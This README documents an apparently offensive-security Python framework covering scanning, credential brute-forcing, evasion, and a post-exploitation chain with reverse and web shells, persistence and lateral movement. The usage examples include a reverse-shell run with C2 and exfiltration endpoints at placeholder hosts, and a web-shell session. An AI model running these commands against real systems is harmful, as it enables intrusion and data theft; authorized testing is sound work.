# Athena Security Suite

> Athena (a.k.a. "Aethelred") is an asynchronous, Python 3 penetration-testing and security-audit framework that automates the full PTES assessment lifecycle: **discovery → vulnerability scanning → credential testing → service enumeration → CVE mapping → reporting**, with optional post-exploitation, evasion, plugins, and compliance logging.

**Use responsibly.** Only scan systems you own or are explicitly authorized to test. Athena has built-in safe-mode and authorization gates, but you are responsible for what you point it at.

---

## Table of Contents

1. [What it does](#what-it-does)
2. [Architecture / how it functions](#architecture--how-it-functions)
3. [The scan workflow](#the-scan-workflow)
4. [Installation](#installation)
5. [Configuration](#configuration)
6. [Usage modes](#usage-modes)
7. [CLI reference](#cli-reference)
8. [Pipeline orchestration](#pipeline-orchestration)
9. [Operator control & preflight](#operator-control--preflight)
10. [Post-exploitation](#post-exploitation)
11. [AI Integration](#ai-integration)
12. [External tool bridge](#external-tool-bridge)
13. [Finding Correlation](#finding-correlation)
14. [Rate Limiting](#rate-limiting)
15. [Plugins](#plugins)
16. [Reports & logs](#reports--logs)
17. [Logging & auditability](#logging--auditability)
18. [REST API server](#rest-api-server)
19. [What is missing / known gaps](#what-is-missing--known-gaps)
20. [Project layout](#project-layout)
21. [Development](#development)

---

## What it does

Athena runs a complete automated penetration test against one or many targets (hostnames, IPs, IP ranges, CIDR blocks) and produces professional audit reports. It does the following out of the box:

| Capability | Details |
|---|---|
| **Web discovery / recon** | URL crawling, recursive content discovery, subdomain brute-force, directory enumeration, robots/.well-known/sensitive-endpoint discovery, secret-leakage detection |
| **Network scanning** | TCP connect, SYN (stealth), UDP, ACK, FIN, NULL, XMAS scans; top-100/1000 or custom port ranges; rate limiting, jitter, concurrency control |
| **Fingerprinting** | Technology detection (headers, cookies, JS libraries, content), OS detection, DNS record analysis (MX/SPF/DKIM/DMARC/NS), TLS certificate inspection |
| **Vulnerability scanning** | 30+ checks: SQLi (error/time/union/boolean), XSS (reflected/stored/DOM), command injection, LFI/path traversal, SSRF, SSTI, XXE, NoSQL/LDAP/XPath injection, CSRF, CORS, JWT, cookie security, GraphQL introspection, prototype pollution, host-header injection, HTTP smuggling, cache poisoning, parameter pollution, race conditions, subdomain takeover, default credentials, security headers, API hardening, and more |
| **Credential testing** | Login-form bruteforcing and default-credential checks against FTP, SSH, MySQL, PostgreSQL, MSSQL, Redis, Telnet |
| **Service enumeration** | SMB (445), SNMP (161), SMTP (25) |
| **CVE mapping** | Fingerprinted technology versions → CVE database lookup, CVSS scoring, exploit availability, CISA KEV cross-reference (`--no-kev` to skip) |
| **External tool engine** | Nuclei (14,000+ templates), sqlmap (SQLi confirmation), dalfox (XSS confirmation), wafw00f (WAF fingerprint), httpx (HTTP recon enrichment) auto-detected and run inside the pipeline; evidence-backed findings enter the same triage/exploitation/report flow as native checks. `--list-tools`, `--no-nuclei`, `--no-sqlmap`, `--no-dalfox`, `--no-wafw00f`, `--no-httpx` |
| **Reporting** | HTML (styled security-audit report with severity cards/charts), JSON, CSV, PDF (via ReportLab/WeasyPrint) |
| **Post-exploitation** | Foothold → enumeration → privilege escalation → lateral movement → data collection → persistence → cleanup chain, with reverse/bind/web shells and persistent sessions |
| **Evasion** | Stealth timing, random user agents, noise headers, proxy support, Tor routing |
| **Compliance** | PCI-DSS and GDPR audit event logging (JSON-lines audit trail) |
| **Logging & auditability** | Structured security-operation events: operator, engagement, target, module, action, timestamp, result, authorization & scope decisions, evidence reference |
| **AI Integration** | Multi-provider LLM analysis (Gemini/Groq/DeepSeek) with automatic failover for finding correlation, prioritization, attack-path reasoning, and report generation |
| **Finding Correlation** | Cross-module deduplication, relationship detection (duplicate/related/causal), impact aggregation |
| **Rate Limiting** | Per-engagement rate limiting with sliding window, burst control, violation tracking |
| **Pipeline Orchestration** | 11-stage PTES-aligned pipeline (engagement → reporting), independently runnable stages, failure isolation, structured states |
| **Operator Control** | Fail-closed operation gate: authorization, scope proof, technique gating, confirmation, audit, rate limits, preflight explanations |
| **Verified Cleanup** | Temporary-artifact registry with verified removal (scrubbing, failure isolation, audit trail) |

---

## Architecture / how it functions

```
athena.py                       ← CLI entry point (argparse), scan orchestrator, state/resume
├── modules/discovery.py        ← recon: crawling, subdomains, ports, fingerprinting, DNS/TLS
├── modules/vulnerability_scanner.py ← 30+ vulnerability test suite (aiohttp)
├── modules/bruteforce.py       ← login-form + service credential testing
├── modules/protocol_scanner.py ← SMB / SNMP / SMTP enumeration + ServiceBruteforcer
├── modules/cve_mapper.py       ← tech version → CVE lookup + CVSS
├── modules/reporting.py        ← HTML/JSON/CSV/PDF report generation
├── modules/exploitation.py     ← SQLi/XSS/command-injection exploit module (used by chain)
├── modules/os_detector.py      ← OS fingerprinting
├── modules/evasion.py          ← EvasionEngine: proxies, Tor, jitter, UA rotation
├── modules/framework_config.py ← env/.env-driven config + presets (stealth/balanced/…)
├── modules/payload_manager.py  ← payload library + WAF-bypass loading (config/payloads.json)
├── modules/plugin_system.py    ← BasePlugin ABC + PluginLoader auto-discovery
├── modules/operations_guide.py ← PTES methodology guide (--guide)
├── modules/logging_config.py   ← console logging + PCI/GDPR audit logger
├── modules/ai_integration.py   ← Multi-provider LLM: correlation, prioritization, attack paths, reports (failover)
├── modules/finding_correlation.py ← Cross-module dedup, relationship detection, impact aggregation
├── modules/rate_limiter.py     ← Per-engagement rate limiting, burst control, violation tracking
├── modules/orchestration.py    ← 11-stage pipeline: StageState, StructuredError, PipelineOrchestrator
├── modules/operation_control.py← OperationGate: preflight plans, authorization, scope/technique gating
├── modules/cleanup_manager.py  ← Verified cleanup of temporary artifacts (scrub, audit, isolation)
└── modules/post_exploitation/  ← orchestrator + 7-phase post-exploitation chain
```

**How it functions:**

- **Entry point** — `athena.py` parses CLI args, applies the operational profile via `load_config()`, resolves targets (hostname → `https://`, IP ranges/CIDR expansion, target files), then runs an async scan session.
- **Phases are pipelined** — each phase consumes output from the previous one (e.g., discovery feeds discovered URLs to the scanner, open ports to the bruteforcer and enumerator, fingerprint results to the CVE mapper).
- **Everything is async** — built on `asyncio` + `aiohttp`, so a single event loop drives concurrent requests with rate limiting and jitter for stealth.
- **Configuration** — class-level attributes on `FrameworkConfig` read from environment variables / `.env` (priority: env var → `.env` → coded default). No secrets live in code.
- **State & resume** — `ScanState` persists progress to `.athena_scan_state.json`; interrupted scans can be resumed with `--resume`.
- **Safety gates** — `SAFE_MODE` (default on) blocks destructive actions; the authorization file (`AETHELRED_AUTHORIZATION.txt`) is required for aggressive features and must be refreshed hourly.
- **Orchestration** — `PipelineOrchestrator` runs stages with isolation, timeout, cancellation and artifact hand-off; every stage can also be run alone (`--stage`). Failures are structured (`StructuredError` codes) and never abort unrelated stages.
- **Fail-closed operator control** — `OperationGate` explains every sensitive operation (WHAT / WHY / TARGET / IN SCOPE / EXPECTED EVIDENCE) before it runs, and denies anything not provably in scope, authorized, and within the engagement's allowed techniques.
- **Verified cleanup** — every temporary artifact is registered with `CleanupManager`, removed afterwards, and removal is only reported `verified` when a follow-up check confirms the artifact is gone.

---

## The scan workflow

A full scan runs these phases in order (`--mode full`):

```
PHASE 1: DISCOVERY & RECONNAISSANCE
  ├─ URL crawl & recursive content discovery
  ├─ Email harvesting
  ├─ Subdomain enumeration (brute-force)
  ├─ Port scanning (default top-1000 TCP; --scan/--ports control type & range)
  ├─ Technology / OS fingerprinting
  ├─ DNS record analysis
  ├─ TLS certificate inspection
  └─ Directory / sensitive-endpoint / secret-leakage checks

PHASE 2: VULNERABILITY SCANNING
  ├─ SQLi, XSS, command injection, LFI, SSRF, SSTI, XXE, …
  ├─ CSRF, CORS, JWT, cookie & security-header checks
  └─ API, GraphQL, misconfiguration & exposure tests

PHASE 3: BRUTEFORCING & AUTH TESTING
  ├─ Login-form bruteforce
  └─ Default credentials on FTP/SSH/MySQL/PostgreSQL/MSSQL/Redis/Telnet

PHASE: SERVICE ENUMERATION
  └─ SMB / SNMP / SMTP enumeration on discovered ports

PHASE: CVE MAPPING
  └─ Fingerprinted technologies + versions → CVEs (CVSS, exploits)

PHASE: REPORTING
  └─ HTML / JSON / CSV / PDF report written to report_<target>.*
```

The full PTES methodology guide (pre-engagement through reporting) is bundled and can be shown with `python athena.py --guide` or exported to JSON with `--guide --export out.json`.

---

## Installation

Requires **Python 3.10+**.

```powershell
# Windows
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
```

```bash
# Linux / macOS
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Optional extras: `tqdm` for progress bars (falls back to plain text if missing). A `run.bat` wrapper is included for Windows (`run.bat <target> <mode>`).

Verify:
```powershell
python athena.py --help
python athena.py --list-plugins
```

---

## Configuration

Copy `.env.example` to `.env` and adjust:

```powershell
Copy-Item .env.example .env
```

Key variables (all optional; sane defaults exist):

| Variable | Default | Purpose |
|---|---|---|
| `AETHELRED_PROFILE` | `balanced` | Operational preset (`stealth`, `balanced`, `aggressive`, `debug`) |
| `AETHELRED_SAFE_MODE` | `true` | Blocks destructive actions; disable only for authorized tests |
| `AETHELRED_STEALTH` | `true` | Enables randomized delays / evasive behavior |
| `HTTP_TIMEOUT` / `HTTP_MAX_RETRIES` / `HTTP_MAX_CONNECTIONS` | 10 / 3 / 10 | HTTP tuning |
| `SCANNING_THREADS` / `DISCOVERY_THREADS` | 10 / 5 | Concurrency |
| `LOG_FILE` / `AUDIT_LOG_FILE` | `aethelred.log` / `athena_audit.log` | Log destinations |
| `PCI_AUDIT_ENABLED` / `GDPR_LOGGING_ENABLED` | `true` | Compliance audit events |
| `DEFAULT_WORDLIST` | `common_files.txt` | Content-discovery wordlist (shipped, ~95 paths; override path via env) |

**Payloads & WAF bypass:** `config/payloads.json` holds WAF-bypass techniques and payload templates. Extend it or register payloads at runtime via `modules/payload_manager.py` (`payload_manager.register_payload(...)`, `payload_manager.load_custom_payloads('my.json')`).

---

## Usage modes

### 1. Scan modes (`-m` / `--mode`)

| Mode | Runs | Use case | Verdict |
|---|---|---|---|
| `full` *(default)* | Discovery + Omega pack → vuln scan → nuclei/dalfox/httpx/wafw00f → bruteforce → enumeration → CVE+KEV → AI triage → verified exploitation → report | Complete assessment | ✅ **GOOD — recommended for real targets** |
| `all` | Everything `full` does, forced exhaustive (all vuln classes + all bruteforce + all enum) | Max-coverage audit, labs | ✅ **GOOD — the all-out scan** (see command below) |
| `discovery` | Recon only (crawl, ports, fingerprint, emails) + Omega pack + enumeration + **hidden-directory/backup-file scanner** | Asset mapping, low-noise recon | ✅ Good |
| `vuln` | Light discovery + vulnerability scan only | Fast vuln check against known URLs | ✅ Good |
| `recon` | Discovery + Omega pack + bruteforce + enumeration + CVE mapping | Extended recon with CVE context | ✅ Good |
| `bruteforce` | Discovery + credential testing | Password/default-cred audit | ⚠️ Niche — use for cred audits only |

Every HTTP mode runs **PHASE 0 WAF gate first** (native + wafw00f, auto-tunes to low-rate + bypass payloads) and the **Omega recon pack** (TLS / GraphQL / takeover / vhost / origin / JS secrets / serialized / supply-chain, `--no-omega` to skip, `--omega-tools` to restrict). Omega findings with evidence join the report set as `source=omega_*`; info/dev-refs stay in the SQLite graph (`~/.athena/graph.db`) only.

**All-out scan (low-FP, max coverage):**
```powershell
playwright install chromium
python athena.py -t TARGET -m all -p balanced --ports top1000 --crawl-max-pages 50 --restart -o html -v
```
Proven on a live ModSecurity host: discovery 167s→82s, native 372→37 (FP filtered), graph 71→96 nodes, first timing-confirmed SSTI. `-p balanced` keeps stealth ON — `aggressive` on a WAF just buys blocks/timeouts.

### 2. Operational profiles (`-p` / `--profile`)

| Profile | Speed | Stealth | Use case |
|---|---|---|---|
| `stealth` | Slow | Maximum | Red-team engagements, IDS/WAF evasion |
| `balanced` | Moderate | Good | General assessments (default) |
| `aggressive` | Fast | Minimal | Labs, CTFs, time-constrained |
| `debug` | Slow | None | Development / troubleshooting (max verbosity) |

### 3. Scan engine options

- `--scan tcp_connect,syn,udp` — port-scan techniques
- `--ports 1-1000 | top100 | top1000 | all | 80,443,8080`
- `--rate N` — max packets/sec · `--concurrent N` — parallel connections · `--jitter N` — random delay ms
- `--proxy URL` or `--tor` — route traffic (Tor expects `socks5://127.0.0.1:9050`)
- `--unsafe` — disable safe mode (authorized testing only)

### 3a. AI integration

Athena can analyse findings with LLMs. Providers are configured in `.env`:

```powershell
# .env
ATHENA_AI_PROVIDER=groq          # gemini | groq | deepseek
ATHENA_AI_MODEL=openai/gpt-oss-120b   # override model for the provider above
GROQ_API_KEY=gsk_your_key
GEMINI_API_KEY=your_gemini_key
```

Each provider ships its own default model (`gemini-flash-latest`, `openai/gpt-oss-120b`, `deepseek-chat`). `ATHENA_AI_MODEL` applies **only** to `ATHENA_AI_PROVIDER`'s backend - a model id for one vendor would 404 on another and silently disable failover. For a specific backend use `ATHENA_AI_MODEL_GEMINI`, `ATHENA_AI_MODEL_GROQ` or `ATHENA_AI_MODEL_DEEPSEEK`. When no key is configured every AI method returns `[]` gracefully.

### 3b. Coverage: authenticated scanning & headless crawl

```powershell
pip install playwright; playwright install chromium   # once, for the headless crawl
python athena.py -t TARGET --auth-user op --auth-pass s3cret --auth-login-url https://target/login
```

- `--auth-user/--auth-pass` (+ optional `--auth-login-url`, else the first discovered login form): exactly **one** login attempt, session verified by logged-in markers before use; every later stage (crawl, vuln scan, exploitation) reuses it. Without credentials the scan runs anonymously as before. Env fallback: `ATHENA_AUTH_LOGIN_URL/USER/PASS/VERIFY`.
- `--no-headless` / `--crawl-max-pages N` (default 30): headless Chromium renders JS-heavy pages the static crawler can't see; found URLs feed the scanner automatically. Skips cleanly when Playwright/Chromium is missing.
- Passwords are never logged, checkpointed, or reported - only the login URL and verification result persist.

### 3c. History: SQLite store, queue & exports

Every finished scan is recorded in `~/.athena/athena.db` (override with `--store PATH` or `ATHENA_DB_PATH`):

```powershell
python athena.py --history                          # list recent scans
python athena.py --export-history 12 --export out --output csv   # re-emit findings
```

API mode (`-m api` / `--api`) additionally serves `GET /scans`, `GET /scans/<id>`, `GET /scans/<id>/export?format=json|csv|sarif`. Scan jobs posted to `POST /scan` are tracked durably - a server restart requeues interrupted jobs instead of losing them (`/scan/status/<id>` still resolves afterwards).

### 4. Output formats (`-o` / `--output`)

`html` *(default)*, `json`, `csv`, `pdf`, `sarif`, or `all`. Reports are written to `report_<target>.*` in the project root, or to a custom path with `--export <path>`. `sarif` (also via `--export-history` and `/scans/<id>/export?format=sarif`) feeds the VS Code Problems panel and GitHub code scanning with stable `athena/<slug>` rule ids - see `docs/VSCODE_AGENT.md` for the editor/agent contract.

### 5. Session control

- `--resume` — continue an interrupted scan from `.athena_scan_state.json`
- `--pause` — pause after each phase (press Enter to continue)

### 6. Operational guide

- `--guide` — interactive PTES guide · `--guide --export guide.json` — export as JSON

### 7. Post-exploitation (`--post*`)

See the [Post-exploitation](#post-exploitation) section below.

---

## CLI reference

```text
python athena.py -t TARGET -m MODE [options]
```

| Flag | Description |
|---|---|
| `-t, --target` | Target URL / IP / hostname (may be a CIDR or IP range) |
| `-f, --target-file` | File of targets, one per line (CIDR/range supported) |
| `-m, --mode` | `full` \| `discovery` \| `vuln` \| `bruteforce` \| `recon` \| `all` (numeric aliases: `1`=full, `2`=discovery, `3`=vuln, `4`=api) |
| `-p, --profile` | `stealth` \| `balanced` \| `aggressive` \| `debug` |
| `--unsafe` | Disable safe mode (authorized testing only) |
| `--api` / `--api-host` / `--api-port` | Start REST API server (see below) |
| `--scan` | `tcp_connect,syn,udp,ack,fin,null,xmas` (comma-separated) |
| `--ports` | `1-1000`, `top100`, `top1000`, `all`, or a list |
| `--rate`, `--concurrent`, `--jitter` | Engine tuning |
| `--proxy`, `--tor`, `--random-agent` | Evasion / routing |
| `-v, --verbose` | DEBUG-level logging |
| `-o, --output` | `html` \| `json` \| `csv` \| `pdf` \| `sarif` \| `all` |
| `--resume` / `--pause` | Session control |
| `--confirm-dangerous` | Interactive Allow/Deny before nuclei, sqlmap/dalfox/wafw00f/httpx, and automated exploitation (default off) |
| `--version` | Print the Athena release version and exit |
| `--guide` / `--list-plugins` | Docs & extension tooling |
| `--list-tools` | Show detected external tools (binary, version, templates) and exit |
| `--no-nuclei` | Skip the external nuclei template engine (runs automatically when installed) |
| `--no-sqlmap` / `--no-dalfox` / `--no-wafw00f` / `--no-httpx` | Skip that engine (each runs automatically when installed) |
| `--no-kev` | Skip CISA KEV cross-referencing of mapped CVEs (on by default, cached feed, offline-safe) |
| `--export <path>` | Custom report / guide output path |
| `--list-stages` | List the 11 pipeline stages and their artifact contracts |
| `--stage <key>` | Run only the given pipeline stage(s) independently (repeatable) |
| `--preflight` | Explain each operation before executing (authorization, scope, expected evidence) |
| `--scope-file` / `--engagement-id` | Bind operations to an engagement (scope + allowed techniques) |

### Examples

```powershell
# Full assessment of a single target
python athena.py -t example.com -m full

# Discovery only, stealth profile, verbose
python athena.py -t example.com -m discovery -p stealth -v

# Vuln scan of a specific URL, HTML report
python athena.py -t https://example.com -m vuln -o html

# Advanced port scan: SYN + UDP on range, rate-limited with jitter
python athena.py -t example.com --scan syn,udp --ports 1-1000 --rate 500 --jitter 50

# Multiple targets from a file, everything enabled, JSON output
python athena.py -f targets.txt -m all -o json

# CIDR block
python athena.py -t 10.0.0.0/24 -m full

# Resume an interrupted scan
python athena.py --resume

# Post-exploitation: reverse shell chain + C2/exfil
python athena.py -t example.com --post --post-shell reverse --c2-url https://c2.example --exfil-url https://exfil.example

# Post-exploitation: register a web shell and go interactive
python athena.py --post-shell web --post-web-url https://target/shell.php --post-interactive

# List the pipeline stages and their artifact contracts
python athena.py --list-stages

# Run one stage independently (no full pipeline)
python athena.py -t example.com --stage discovery

# Run a sub-chain of stages (repeatable flag)
python athena.py -t example.com --stage discovery --stage scanning --stage reporting

# Preflight: explain operations before executing (fail-closed gating)
python athena.py -t example.com --preflight

# Discovery only with JSON output (includes hidden-directory & backup-file scanner)
python athena.py -t example.com -m discovery -o json
```

---

## Pipeline orchestration

The assessment pipeline (`modules/orchestration.py`) models the PTES lifecycle as **11 independently runnable stages**:

```
engagement → recon → enumeration → discovery → scanning → validation
          → initial_access → post_exploitation_assessment → attack_path_analysis
          → impact_assessment → reporting
```

Key concepts:

- **Stage states** — every stage ends in one of ten structured states: `queued`, `running`, `completed`, `failed`, `timeout`, `cancelled`, `blocked_by_scope`, `blocked_by_policy`, `requires_authorization`, `partial`.
- **Structured errors** — failures carry a stable `code` (e.g. `BLOCKED_BY_SCOPE`, `MISSING_DEPENDENCY`, `STAGE_TIMEOUT`) so callers can react without parsing text.
- **Failure isolation** — a failed stage never aborts the pipeline; unrelated stages keep running, and dependent stages are gated with `MISSING_DEPENDENCY` instead of crashing.
- **Artifact hand-off** — each stage declares `produces` / `requires` artifact keys; completed outputs are handed to later stages.
- **Independent execution** — any stage can be run alone via `--stage` (module-backed stages run real modules; the remaining stages are orchestration seams awaiting a module and fail with `STAGE_NOT_IMPLEMENTED` — see [known gaps](#what-is-missing--known-gaps)).

Programmatic usage:

```python
from modules.orchestration import PipelineOrchestrator, StructuredError

async def my_discovery():
    return {"urls": ["https://example.com"], "technologies": ["nginx"]}

orchestrator = PipelineOrchestrator(engagement_id="eng-1")
async def my_scan():
    raise StructuredError("SCANNER_DOWN", "scanner crashed")

results = await orchestrator.run_pipeline(
    {"discovery": my_discovery, "scanning": my_scan})
print(results["scanning"].state.value)      # "failed"
print(results["scanning"].error["code"])    # "SCANNER_DOWN"
print(orchestrator.report()["state_counts"])  # {"completed": 1, "failed": 1}
```

---

## Operator control & preflight

`modules/operation_control.py` provides **fail-closed operator control** over sensitive operations. Before anything runs, an operation is described by an `OperationPlan` and shown as a preflight explanation:

```
PREFLIGHT OPERATION EXPLANATION
  WHAT:              Validation (pipeline stage)
  WHY:               Deterministic confirmation of candidate findings with evidence.
  TARGET:            https://example.com
  TARGET IN SCOPE:   YES (in scope)
  EXPECTED EVIDENCE: validated_findings
  SCOPE REASON:      matches in-scope URL rule
  TECHNIQUE:         controlled_validation
  CONFIRMATION:      REQUIRED (operator decision)
```

The `OperationGate` then enforces, in order (first denial wins):

1. **Engagement exists & is active** — no engagement ⇒ denied (Athena fails closed).
2. **Scope proof** — the target must be provably in scope (reachability is never authorization).
3. **Technique gating** — the technique must be allowed by the engagement (allow/restrict lists).
4. **Confirmation** — techniques such as controlled validation, persistence, lateral assessment and cleanup require an explicit operator confirmation (`requires_authorization` otherwise).
5. **Rate limiting** — per engagement + operator.
6. **Audit** — every decision is written to the compliance audit log.

```python
from modules.operation_control import OperationGate

gate = OperationGate(engagement=engagement, operator="you", audit=audit_logger)
plan = gate.plan(
    action="Enumerate SMB shares", rationale="Authorized assessment",
    target="10.0.0.5", technique="recon",
    expected_evidence=["shares", "versions"])
print(gate.explain(plan))

outcome = await gate.execute(plan, my_async_fn, timeout_seconds=300)
print(outcome["state"])  # "completed" | "blocked_by_scope" | ...
```

## Verified cleanup

`modules/cleanup_manager.py` tracks every temporary artifact Athena creates and removes it afterwards with **verification**: removal is only reported `verified` when a follow-up check confirms the artifact is gone (or was never created). Cleanup failures are isolated (one stuck artifact does not block the rest), artifacts can be zero-filled before deletion (`scrub=True`), and every registration/removal is written to the audit log.

```python
from modules.cleanup_manager import CleanupManager

cleanup = CleanupManager(audit=audit_logger)
cleanup.register("/tmp/athena_evidence.bin", scrub=True)
report = cleanup.cleanup()          # never raises
assert report["verified"]           # False if anything remains
print(report["remaining"])
```

---

## Post-exploitation

The post-exploitation chain (`modules/post_exploitation/`) runs 7 ordered phases after a foothold:

```
FOOTHOLD → ENUMERATION → PRIVESC → LATERAL → DATA_COLLECTION → PERSISTENCE → CLEANUP
```

Key concepts:

- **Sessions** (`PostSession`) — abstract remote shells with `exec`/`upload`/`download` over a transport.
- **Shell types** — `reverse` (listener on your host), `bind`, or `web` (web-shell URL).
- **Transports** — reverse TCP, bind TCP, web shell, with bash/sh/cmd/PowerShell/Python/PHP/Perl/netcat languages.
- **Orchestrator** — configures C2/exfil endpoints, run phases automatically or step through manually (`--post-manual`), restrict (`--post-only`) or skip (`--post-skip`) phases.
- **Sessions persist** across runs (`session_mgr.save()`); list them with `--post-list-sessions`, interact with `--post-interactive`.

Flags:

| Flag | Description |
|---|---|
| `--post` | Run post-exploitation after scanning |
| `--post-shell` | `reverse` \| `bind` \| `web` |
| `--post-host` / `--post-port` | Listener host / port (default `0.0.0.0:4444`) |
| `--post-web-url` / `--post-web-param` / `--post-web-method` | Web-shell connection |
| `--post-manual` | Step through phases interactively |
| `--post-only` / `--post-skip` | Restrict / skip a single phase |
| `--post-list-sessions` | List saved sessions |
| `--post-interactive` | Open an interactive console |
| `--c2-url` / `--exfil-url` | C2 callback / exfiltration endpoints |

---

## AI Integration

Athena includes AI-powered analysis with **multi-provider support and automatic failover**: Gemini, Groq and DeepSeek. If the primary provider fails (network error, HTTP error, missing key), the call falls through to the next configured provider, and `last_provider` reports who answered. The AI integration provides:

- **Finding Correlation** — Identify duplicates, related findings, and causal relationships
- **Prioritization** — Rank findings by risk (severity, exploitability, asset criticality)
- **Attack Path Analysis** — Identify how findings connect into attack chains
- **Report Generation** — Generate executive summaries and technical narratives

### Configuration

Set any API key as an environment variable; the first configured provider wins:

```powershell
# Primary provider (Gemini)
[System.Environment]::SetEnvironmentVariable("GEMINI_API_KEY", "your-api-key", "User")

# Optional failover providers (tried in order: Gemini → Groq → DeepSeek)
$env:GROQ_API_KEY = "your-groq-key"
$env:DEEPSEEK_API_KEY = "your-deepseek-key"

# Force a specific provider (default: gemini | groq | deepseek)
$env:ATHENA_AI_PROVIDER = "groq"

# Optional: override the default model per provider
$env:ATHENA_AI_MODEL = "custom-model"
```

### Usage

```python
from modules.ai_integration import AIIntegration

ai = AIIntegration()  # resolves provider from ATHENA_AI_PROVIDER / configured keys

# Correlate findings
result = await ai.correlate_findings(findings, evidence)

# Prioritize by risk
prioritized = await ai.prioritize_findings(findings)

# Generate report narrative
narrative = await ai.ai_generate_report_narrative(engagement, findings, evidence)

# Which provider answered the last call?
print(ai.last_provider.value)   # "gemini" | "groq" | "deepseek"
```

### Design Principles

- **LLM is never the source of truth** — Deterministic tools and collected evidence remain authoritative
- **Graceful degradation** — All methods return empty results when no API key is configured; a failing provider is bypassed via failover, never fatal
- **Confidence scoring** — All AI statements include confidence levels and reasoning types

---

## External tool bridge

Athena's own checks are pure Python. Where an established engine adds real
coverage it is called through a small adapter layer (`modules/tool_bridge.py`)
that enforces four rules:

1. **Clean degradation** - a missing binary is a structured status plus one
   console line, never a crash.
2. **Evidence only** - a tool contributes a finding only when it produced a
   concrete match (matched URL, matcher name, extracted value). No match, no
   finding.
3. **No shell** - commands are argv lists handed to `create_subprocess_exec`,
   so target strings can never be interpreted as shell syntax.
4. **Bounded** - every run has a wall-clock timeout, a findings cap and a
   rate limit, and the argv is recorded in the report.

### Installing the engines (one command, per-user, GitHub-safe)

```powershell
python scripts/install_tools.py
python scripts/install_tools.py --verify-only
python athena.py --list-tools
```

Downloads official releases at install time (nothing binary is committed):
nuclei, dalfox, ProjectDiscovery httpx, sqlmap into
`%LOCALAPPDATA%\Programs\athena-tools` (Windows) or `~/.local/bin`
(Linux), plus `pip install wafw00f`. Missing tools stay `unavailable`
and the native scan still runs.

### nuclei

```powershell
# Is it installed, which version, are the templates there?
python athena.py --list-tools

# Run it as part of a scan (default), or skip it
python athena.py -t TARGET -m vuln
python athena.py -t TARGET -m vuln --no-nuclei
```

- Auto-detects the binary on `PATH` and in `%LOCALAPPDATA%\Programs\athena\tools`
- Auto-installs the template repository on first run if it is missing
- Runs in `-m vuln` and `-m full` against the primary origin, after the
  built-in scanner and before AI triage, so its hits are adjudicated and
  attempted like any other finding
- Severity `critical,high,medium,low,info`; excludes `dos,bruteforce,fuzz,submitit`
- Rate limited (150 req/s, 50 in stealth) so an unthrottled template run
  cannot trip the target's WAF mid-scan
- Results land in the report's **External Tool Runs** section with status,
  match count, duration and binary path

nuclei itself is free and open source, no API key:
<https://github.com/projectdiscovery/nuclei>

### sqlmap / dalfox / wafw00f / httpx

```powershell
# Run as part of a scan (default when installed), or skip individually
python athena.py -t TARGET -m vuln
python athena.py -t TARGET -m vuln --no-sqlmap --no-dalfox
```

- **sqlmap** confirms SQL injection on the top query-string candidate URL
  (bounded: 1 URL, `--level 1 --risk 1`, 150s cap, run via
  `sys.executable + sqlmap.py` so the `.cmd` shim can never break it).
  Confirmed parameters become CRITICAL findings:
  <https://github.com/sqlmapproject/sqlmap>
- **dalfox** confirms XSS over up to 10 candidate URLs (90s cap each, host
  skip after one timeout + fan-out stop after two); only verified (`V`)
  results become HIGH findings, reflected/AST/info results are ignored:
  <https://github.com/hahwul/dalfox>
- **wafw00f** fingerprints the WAF in front of the target (30s cap). A hit
  is one INFO finding used for payload/rate tuning, never a vulnerability:
  <https://github.com/EnableSecurity/wafw00f>
- **httpx** (ProjectDiscovery build) probes the target and folds discovered
  technologies/versions into recon so CVE mapping sees servers the crawler
  missed (60s cap, zero vulnerability findings):
  <https://github.com/projectdiscovery/httpx>
- Missing binaries print one skip line each; the scan continues unchanged.
  `ffuf` is intentionally not integrated yet.

### CISA KEV enrichment

Mapped CVEs are cross-referenced against the CISA Known Exploited
Vulnerabilities catalog (`modules/kev.py`, cached 24h in
`.athena_kev_cache.json`, offline-safe). KEV-listed CVEs are badged
`[KEV - exploited in the wild]` in JSON/HTML reports. Opt out with
`--no-kev`.

---

## Finding Correlation

The finding correlation module provides cross-module deduplication and relationship detection.

### Features

- **Deduplication** — Groups findings by normalized keys (title, asset, module, type)
- **Relationship Detection** — Identifies related findings, duplicates, and causal chains
- **Impact Aggregation** — Combines severity scores across related findings
- **Filtering** — Filter by severity, asset, module, or engagement

### Usage

```python
from modules.finding_correlation import FindingCorrelator

correlator = FindingCorrelator()

# Deduplicate findings
unique, duplicates = correlator.deduplicate_findings(findings)

# Detect relationships
relationships = correlator.detect_relationships(findings)

# Aggregate impact
aggregated = correlator.aggregate_impact(findings)
```

---

## Rate Limiting

Per-engagement rate limiting with sliding window algorithm.

### Features

- **Sliding Window** — Token bucket algorithm with configurable windows
- **Burst Control** — Limits burst requests per window
- **Per-Engagement Config** — Different limits for different engagements
- **Violation Tracking** — Tracks and reports rate limit violations

### Usage

```python
from modules.rate_limiter import RateLimiter, RateLimitConfig

limiter = RateLimiter(config=RateLimitConfig(
    max_requests=100,
    window_seconds=60,
    burst_limit=10,
))

# Check rate limit
result = limiter.check_limit(engagement_id="eng1", operator_id="user1")
if not result.allowed:
    print(f"Rate limited: {result.reason}")

# Get usage stats
stats = limiter.get_usage_stats(engagement_id="eng1")
```

---

## Plugins

Plugins extend the framework. `PluginLoader` auto-discovers any class subclassing `BasePlugin` in the `plugins/` directory. Shipped plugins:

- `dns_enum` — DNS enumeration
- `wordpress_scanner` — WordPress fingerprinting

```powershell
python athena.py --list-plugins
```

Programmatic usage:

```python
from modules.plugin_system import PluginLoader
loader = PluginLoader()
await loader.run_plugin('wordpress_scanner', 'https://example.com')
```

---

## Reports & logs

Each scan produces:
- `report_<target>.html` / `.json` / `.csv` / `.pdf` — the audit report
- `aethelred.log` — detailed operational log
- `athena_audit.log` — compliance audit trail (single-line JSON events per PCI-DSS/GDPR action)
- `post_exploit_<session>.json` — post-exploitation chain report

Report structure (`report_<target>.json`):

```json
{
  "target": "example.com",
  "timestamp": "...",
  "discovery": { "subdomains": [], "urls": [], "technologies": [], "ports": [], ... },
  "vulnerabilities": [ { "type": "...", "severity": "CRITICAL|HIGH|MEDIUM|LOW", "url": "...", "description": "..." } ],
  "bruteforce": { "web_logins": [], "service_creds": [], "default_creds": [] },
  "enumeration": { "smb": {}, "snmp": {}, "smtp": {} },
  "cve_mapping": [ { "technology": "...", "version": "...", "cves": [], "max_cvss": 9.8 } ]
}
```

